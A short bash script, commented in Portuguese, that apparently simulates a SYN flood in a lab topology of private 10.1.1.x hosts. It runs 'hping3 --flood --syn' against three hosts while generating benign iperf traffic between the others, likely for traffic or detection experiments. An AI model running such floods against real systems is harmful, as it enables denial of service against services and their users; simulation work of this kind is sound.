#!/bin/bash


ATTACK_PORT=80     
DURATION=60           
TOTAL_NODES=6         
NODES_TO_ATTACK=3     

# IPs dos hosts na topologia
HOST_IPS=("10.1.1.1" "10.1.1.2" "10.1.1.3" "10.1.1.4" "10.1.1.5" "10.1.1.6")

# ataque SYN flood com hping3
start_syn_flood_attack() {
    for i in $(seq 0 $((NODES_TO_ATTACK - 1))); do
        TARGET_IP=${HOST_IPS[$i]}
        echo "Iniciando ataque SYN flood para $TARGET_IP na porta $ATTACK_PORT..."
        sudo hping3 --flood --syn -p $ATTACK_PORT $TARGET_IP &
        ATTACK_PIDS[$i]=$!
        echo "Ataque iniciado para $TARGET_IP com PID ${ATTACK_PIDS[$i]}"
    done
}

# gerando tráfego benigno com iperf
start_benign_traffic() {
    echo "Iniciando tráfego benigno entre os nós restantes..."
    for i in $(seq $NODES_TO_ATTACK $((TOTAL_NODES - 1))); do
        HOST_IP_1=${HOST_IPS[$i]}
        HOST_IP_2=${HOST_IPS[$((i + 1)) % TOTAL_NODES]} 

        # iperf no HOST_IP_2 como servidor
        ssh user@$HOST_IP_2 "iperf -s" &
        IPERF_SERVER_PID=$!

        # iperf no HOST_IP_1 como cliente
        iperf -c $HOST_IP_2 -t 60 -i 10

        kill $IPERF_SERVER_PID
    done
}

stop_attack() {
    echo "Parando ataques SYN flood..."
    for pid in "${ATTACK_PIDS[@]}"; do
        kill $pid
    done
}

# array para armazenar os PIDs dos ataques
declare -a ATTACK_PIDS

start_syn_flood_attack
start_benign_traffic
sleep $DURATION
stop_attack

echo "Simulação concluída!"
